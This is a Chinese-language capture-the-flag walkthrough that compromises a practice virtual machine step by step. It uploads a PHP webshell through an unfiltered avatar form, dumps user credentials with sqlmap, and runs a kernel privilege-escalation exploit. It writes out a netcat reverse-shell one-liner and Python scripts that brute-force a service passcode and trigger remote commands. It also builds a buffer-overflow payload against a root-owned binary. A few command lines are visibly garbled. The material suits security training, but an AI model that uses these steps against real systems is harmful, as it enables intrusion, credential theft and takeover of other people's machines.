## 一、信息收集

### 1.探测主机存活

```
sudo arp-scan 10.0.2.0/24
```

![image-20211117175256383](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175256383.png)

### 2.端口扫描

```
sudo nmap -p- 10.0.2.12
```

![image-20211117175552751](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175552751.png)

结果显示目标开放了22,80,8000端口

### 3.端口服务扫描

```
sudo nmap -sV -p22,80,8000 10.0.2.12
```

![image-20211117175710597](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175710597.png)

22端口 SSH

80端口 Apache2.4.29 Ubuntu(操作系统)

8000端口 BaseHTTPServer Python2.7.15(目标靶机支持Python环境)

## 二、漏洞发现

### 1.访问8000端口

#### 1.1页面报错

![image-20211117175907396](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175907396.png)

页面信息报错：服务器**不支持GET方法**

#### 1.2尝试更改请求方法

抓包发送到Repeater

![image-20211118091243343](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091243343.png)

分别更改为其他各种HTTP请求方法，分别提交

![image-20211118091738052](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091738052.png)

![image-20211118091813470](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091813470.png)

![image-20211118091930161](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118091930161.png)

![image-20211118092037650](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118092037650.png)

![image-20211118092119731](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118092119731.png)

在尝试诸多不同的请求方法后，返回的结果也是**报错失败**

### 2.访问80端口

![image-20211117175818445](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117175818445.png)

#### 2.1测试登录功能

尝试进行登录

![image-20211117180300696](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117180300696.png)

发现登陆页面需要邮箱和密码，且**存在邮箱格式的校验**

#### 2.2测试注册功能

简单的注册一个账号

![image-20211118102057359](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102057359.png)

注册完毕后自动跳转到 该用户登录后的页面

![image-20211118102610231](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102610231.png)

对页面中的信息进行查看，发现名为admin的用户留言显示后台运行监视服务器的**python脚本**，名为**monitor.py**，在此也难免想起之前对端口服务扫描的时候，8000端口的名为BaseHTTPServer的服务和python环境，之后存在可利用的可能性

![image-20211118102735643](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102735643.png)

继续对网站页面内的其他板块功能进行测试，在Profile页面内显示当前用户未提交--这里指的应该是留言/发帖

![image-20211118103438523](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103438523.png)

简单提交一些信息

![image-20211118103739734](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103739734.png)

发现Profile页面可以正常访问，且发现上传头像区，那是否也可尝试**文件上传**木马呢？

![image-20211118103916272](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118103916272.png)

#### 2.3测试页面

##### 文件上传

新建aa.php文件，写入一句话木马，并上传

```
vi aa.php
```

![image-20211118104652005](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118104652005.png)

没有对文件的后缀和内容进行过滤，此时头像虽未显示，但已经被替换为刚才上传的php文件

![image-20211118104836716](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118104836716.png)

复制头像的地址

![image-20211118105035254](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118105035254.png)

使用蚁剑连接

![image-20211118105408035](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118105408035.png)

![image-20211118145211734](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118145211734.png)

![image-20211118145647280](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118145647280.png)

成功拿到目标靶机的基本权限

##### SQL注入

再次回到页面，尝试对其他功能进行测试。

最终发现在搜索栏内提交了单引号后

![image-20211118150028569](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118150028569.png)

页面显示后台数据库的报错信息，目标数据库应是MySQL数据库，使用SQLMAP进行测试

​	使用Burp抓取提交过程中的数据并将其复制至test文件

![image-20211118150619413](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118150619413.png)

```
sqlmap -r test -p query     #-p 指定参数
```

![image-20211118151256012](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151256012.png)

![image-20211118151238752](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151238752.png)

确定存在SQL注入漏洞，接下来就可以进行信息的获取了

```
sqlmap -r test -p query --dbs
```

![image-20211118151606121](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151606121.png)

```
sqlmap -r test -p query -D socialnetwork --tables
```

![image-20211118151752362](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151752362.png)

```
sqlmap -r test -p query -D socialnetwork -T users --columns
```

![image-20211118151941038](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118151941038.png)

```
sqlmap -r test -p query -D socialnetwork -T users -C user_email,user_password --dump
```

![image-20211118152315735](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152315735.png)

获得了admin账号的邮箱地址和密码，使用admin登录

![image-20211118152420558](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152420558.png)

![image-20211118152513424](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118152513424.png)

但是在admin账号内也未发现可利用的信息。



## 三、提权

### CVE-2021-3493本地提权（时间提权术）

再次回到蚁剑shell中

![image-20211118153207728](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118153207728.png)

目标内核4.15.0-38 操作系统Ubuntu版本为18.04.1 现在较新的版本18.04.5

查询发现了较新的通用公共漏洞--

![image-20211118154013454](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118154013454.png)

思路：上传至目标靶机上，使用gcc编译后，本地执行

使用蚁剑文件管理上传到目标靶机上

![image-20211118155210947](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118155210947.png)

使用gcc编译后才可执行

```
gcc -o exp exploit.c
```

```
chmod +x exp
```

```
./exp
```

![image-20211118155624865](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118155624865.png)

似乎在蚁剑的shell内不能正常运行，尝试使用nc的shell

![image-20211118160045951](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118160045951.png)

不支持-e参数（可使用串联方法），这里为了拓展攻击方法的多样性，使用命令

kali:

```
nc -nvlp 4444
```

![image-20211122111610268](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122111610268.png)

蚁剑shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.4 4444 >/tmp/f
```

>rm /tmp/f 删除该文件（以免跟后面定义的 管道符 冲突）
>
>mkfifo /tmp/f 这是创建自定义有名管道符。管道符的名称是 /tmp/f （用于进程间的通讯， 如 ls > /tmp/f ，cat /tmp/f ,连通两个进程之间的通讯)
>
>cat /tmp/f 取出管道符中的内容
>
>|/bin/sh -i 2>&1 将前面取出的内容作为输入，输入给 /bin/sh，再将bash的标准错误输出 也作为标准输入 （2 >&1）给bash 然后再将bash的输出，传给nc 远程，再将nc 传来的数据，写入 管道符 /tmp/f 。最后首尾接通了。

![image-20211122112048252](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112048252.png)

执行后成功上线

![image-20211122112120594](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112120594.png)

![image-20211122112256382](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122112256382.png)



```
python -c "import pty; pty.spawn('/bin/bash')"
```

![image-20211122113004129](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122113004129.png)

```
./exp
```

![image-20211122113224509](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122113224509.png)

成功提权到root权限

### 回到起点

利用内核漏洞提权后，尝试其他方法

功成身退🤦‍

```
exit
```

![image-20211122114416703](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114416703.png)



回到普通权限后 搜集当前权限下有无可用信息

```
cat /etc/passwd
```

![image-20211122114629491](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114629491.png)

发现用户socnet具有bash 权限，猜测其可能为主要管理账号

尝试查看/home目录下是否存在该用户文件夹

```
cd /home
```

```
ls
```

```
cd socnet
```

![image-20211122114956833](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211122114956833.png)

发现了名为**monitor.py**的脚本，难免会想到之前在网站页面内admin用户的留言描述为后台运行的用来监视服务器的**python脚本**

![image-20211118102735643](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211118102735643-20220219102034629.png)

```
ps aux | grep monitor
```

![image-20211124093318091](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124093318091.png)

查看进程发现monitor.py在运行 那么不妨查看一下该文件代码

```
cat monitor.py
```

简单分析一下：

> #my remote server management API #备注为远程管理的API
> import SimpleXMLRPCServer #导入了XMLRPC的库
> import subprocess #创建进程
> import random #生成随机数
>
> debugging_pass = random.randint(1000,9999) #生成1000-9999区间的随机数
>
> def runcmd(cmd):          #定义函数runcmd和变量cmd
>     results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  
>
> #创建新的进程 执行变量cmd 启用一个新的shell执行命令 并将shell的输出和报错信息都定义为新的变量
>     output = results.stdout.read() + results.stderr.read() 
>     return output
>
> #使用output变量统一将结果输出到页面
>
> def cpu():
>     return runcmd("cat /proc/cpuinfo")
>
> #定义变量cpu 调用runcmd函数执行cat /proc/cpuinfo查看cpu相关信息
>
> def mem():
>     return runcmd("free -m")
>
> #查看操作系统内存大小使用情况
>
> def disk():
>     return runcmd("df -h")
>
> #查看当前系统磁盘存储
>
> def net():
>     return runcmd("ip a")
>
> #查看当前网络配置信息
>
> def secure_cmd(cmd,passcode):
>     if passcode==debugging_pass:
>          return runcmd(cmd)
>     else:
>         return "Wrong passcode."
>
> #**判断校验passcode变量 若相同则可执行命令**
>
> server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))    #联想到8000端口页面的请求报错信息
> server.register_function(cpu)
> server.register_function(mem)
> server.register_function(disk)
> server.register_function(net)
> server.register_function(secure_cmd)
>
> server.serve_forever()

搜索了解一下XML-RPC

（https://docs.python.org/zh-cn/3/library/xmlrpc.html）

![image-20211124094504425](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124094504425.png)

![image-20211124095619187](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124095619187.png)

结合monitor.py和示例客户端代码，进行调试

```
vi a.py
```

![image-20211124111612734](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124111612734.png)

>import xmlrpc.client
>
>with xmlrpc.client.ServerProxy("http://10.0.2.12:8000/") as proxy:
>    	print(str(proxy.cpu()))

执行测试是否可行(在shell里不好编辑，可用蚁剑上传)

```
python3 a.py
```

![image-20211124105602436](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124105602436.png)

成功打印出cpu信息

```
vi b.py
```

![image-20211124112829598](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124112829598.png)

>import xmlrpc.client
>
>with xmlrpc.client.ServerProxy("http://10.0.2.12:8000/") as proxy:
>
>​	for p in range(1000,10000):
>
>   	r = str(proxy.secure_cmd('whoami',p))
>
>​		if not "Wrong" in r:
>
>​				print(p)
>
>​				print(r)
>
>​				break

```
python3 b.py
```

![image-20211124112719226](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124112719226.png)

执行成功，passcode为1447

kali端：

```
nc -nvlp 5555
```

![image-20211124141525887](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141525887.png)

```
vi c.py
```

![image-20211124141640107](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141640107.png)

>import xmlrpc.client
>
>with xmlrpc.client.ServerProxy("http://10.0.2.12:8000/") as proxy:
>    cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.4 5555 >/tmp/f"
>    r = str(proxy.secure_cmd(cmd,1447))
>    print(r)

```
python3 c.py
```

![image-20211124141913344](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124141913344.png)

```
python -c "import pty;pty.spawn('/bin/bash')"           #优化shell
```

![image-20211124142428803](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124142428803.png)

查看socnet用户目录下的文件

```
ls -l
```

![image-20211124142732587](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124142732587.png)



### 二次提权

```
file add_record
```

![image-20211124143037766](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124143037766.png)

发现该文件可执行且其属主账号为root

再看目录下的peda文件

peda是基于python的动态调试脚本

![image-20211124145232452](https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124145232452.png)

执行add_record程序

```
./add_record
```

![image-20211124145559990](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145559990.png)

![image-20211124145716660](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145716660.png)

简单测试了下该程序的各个功能

同时也发现当前目录下生成了类似于日志文件 查看它

```
ls -l
```

```
cat employee_records.txt
```

![image-20211124145917807](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124145917807.png)

针对每一个可以提交数据的点进行测试，测试是否存在内存溢出等问题

使用gdb（能够对程序运行中寄存器、堆栈、内存、函数调用、数据变化等使用情况进行详细的跟踪、判断)

```
gdb -q ./add_record
```

```
gdb-peda$ r
```

![image-20211124151021962](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151021962.png)

生成500个A并复制粘贴测试

```
python -c "print('A'*500)"
```

![image-20211124151203410](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151203410.png)

![image-20211124151247420](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151247420.png)

程序正常退出了 没有产生异常溢出情况

对剩下的输入点进行测试

![image-20211124151456339](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151456339.png)

![image-20211124151545051](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151545051.png)

![image-20211124151631593](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124151631593.png)

![image-20211124152138188](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124152138188.png)

功夫不负有心人，在最后发现explain变量没有对内存做良好的限制导致溢出，这里重点关注寄存器EIP（EIP 寄存器里存储的是**CPU下次要执行的指令的地址**。）已经被填满，那就需要精确的知道寄存器EIP中的四个A的位置，若是知道就可以尝试在此位置执行payload

经过对数量进行测试 ：

发现300个、200个、100个都会造成溢出，但50个不会，已经缩小了范围。

接下来生成一段特征字符(连续的每四个字符都不相同)

```
gdb-peda$ pattern create 100
```

![image-20211124153203054](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153203054.png)

再将其输入至explain使其溢出

![image-20211124153409310](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153409310.png)

可以直观的看到寄存器EIP位置内的数据为AHAA

>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2A**AHAA**dAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

```
gdb-peda$ pattern search
```

![image-20211124153749453](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124153749453.png)

得到寄存器EIP的偏移量位置为62，即从第63个字符开始就会进入寄存器EIP中

生成62个A用来占位 再添加BCDE 再次用来验证

```
python -c "print('A'*62+'BCDE')"
```

![image-20211124154441052](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124154441052.png)

![image-20211124154528961](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124154528961.png)

到此可以确定，已经可以精准的向寄存器EIP内写入

补充：在CPU内存储数据时是倒序存储的    ASCII码：42--B 43--C 44--D 45--E

查看汇编代码

```
gdb-peda$ disas main
```

![image-20211124162244701](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162244701.png)

调用了fopen可能是用于打开文件的 put输出内容 print显示

在调用put函数之前的地址0x0804873d设置断点，进一步观察

```
gdb-peda$ break * 0x0804873drd
```

```
gdb-peda$ r
```

![image-20211124162444002](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162444002.png)

添加断点后运行程序可以发现提前触及了断点

单步执行（每次只执行一个cpu指令）

```
gdb-peda$ s
```

![image-20211124162836920](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124162836920.png)

可以看到这里执行了程序的欢迎语，

![image-20211124163004119](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124163004119.png)

那么就可以确定在此开始程序的第一步

同个增加断点单步运行逐个尝试其他调用功能，将其对应起来

```
gdb-peda$ del 1  #删除断点
```

寻找一个调用printf的位置在其之前设置断点

```
gdb-peda$ break * 0x0804877b
```

![image-20211124163823804](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124163823804.png)

![image-20211124164219850](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124164219850.png)

经过逐个的尝试 对该程序的程序逻辑有了更具体的了解

姓名： 0x08048750 <+120>:   call   0x8048480 < printf@plt >           

工作年限：0x0804877c <+164>:   call   0x8048480 < printf@plt >

工资：0x080487a4 <+204>:   call   0x8048480 < printf@plt >

是否有问题：0x080487cc <+244>:   call   0x8048480 < printf@plt >

若有为1 问题解释：0x08048810 <+312>:   call   0x8048480 < printf@plt >

在查看的过程中发现一则调用

![image-20211124165222750](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124165222750.png)

在0x08048834位置调用了vuln 首先这不是一个熟知的函数 其次函数名后没有@plt标识 又顾名思义难免联想到脆弱点等 猜测这是软件开发者自己写的函数

![image-20211124165344555](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124165344555.png)

查看当前程序中内嵌的函数

```
gdb-peda$ info func
```

![image-20211124170306580](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124170306580.png)

发现setuid函数，结合之前ls -l查看add_record文件的权限和所属者是root的信息，猜测使用这个函数调用系统权限  看到的system函数是否可以执行操作系统指令呢？ backdoor "后门"？存在一系列疑问，也渐渐有了方向

分别查看这个几个函数在程序中有什么动作？

```
gdb-peda$ disas vuln
```

![image-20211124170831901](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124170831901.png)

对strcpy函数进行搜索，该函数曾存在缓冲区溢出漏洞

![image-20211124171130950](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124171130950.png)

```
gdb-peda$ disas backdoor
```

![image-20211124171814589](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124171814589.png)

调用了setuid函数提权，调用了system函数执行指令，

思考：我们需要对system函数进行跟踪，则需要记录下起始的内存地址（0x08048676），通过程序的正常执行，通过explain变量注入的数据，在62个字节之后，如果能把该地址写入EIP寄存器中，EIP寄存器就会读取该地址下的所有指令，并分别执行setuid、system指令，紧接着可以通过设置断点，单步跟进到system指令，查看其执行了什么命令，是否有可利用的点？来实现提权的目标。

思路：

主程序会调用执行vuln函数-->vuln函数又调用了存在缓冲区溢出漏洞的内嵌函数strcpy-->但主程序内并未调用backdoor函数-->所以利用主程序内加载的vuln函数中的strcpy函数的缓冲区溢出漏洞-->向EIP寄存器内写入backdoor的起始内存加载地址-->以执行backdoor函数-->执行setuid函数、执行system函数-->执行system函数中的操作系统指令-->有没有可能注入payload-->完成本地提权？



向EIP寄存器内写入backdoor的起始内存加载地址（定向到payload内）：

```
python -c "import struct; print('zz\n1\n1\n1\n' + 'A'*62 + struct.pack('I', 0x08048676))" > payload
```

```
cat payload
```

![image-20211124174848606](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124174848606.png)

```
gdb-peda$ q     #退出调试器
```

回到目标靶机

```
。r b r
```

![image-20211124175728595](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124175728595.png)

```
gdb -q ./add_record    #重新打开gdb调试
```

```
gdb-peda$ r < payload
```

![image-20211124175923850](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124175923850.png)

结果耐人寻味：产生了两个新的进程，4312执行了程序/bin/dash ，4313执行了程序/bin/bash

为什么产生这样的结果?去分析一下

```
gdb-peda$ q     #退出调试器
```

```
gdb -q ./add_record    #重新打开gdb调试
```

```
gdb-peda$ disas main
```

尝试在调用vuln前增加断点单步分析

```
gdb-peda$ break vuln
```

```
gdb-peda$ r < payload
```

![image-20211124181204165](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124181204165.png)

```
gdb-peda$ s       #进行单步执行         
```

在进行多次单步执行调试后

```
cat payload - | ./add_record
```

![image-20211124192251868](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124192251868.png)

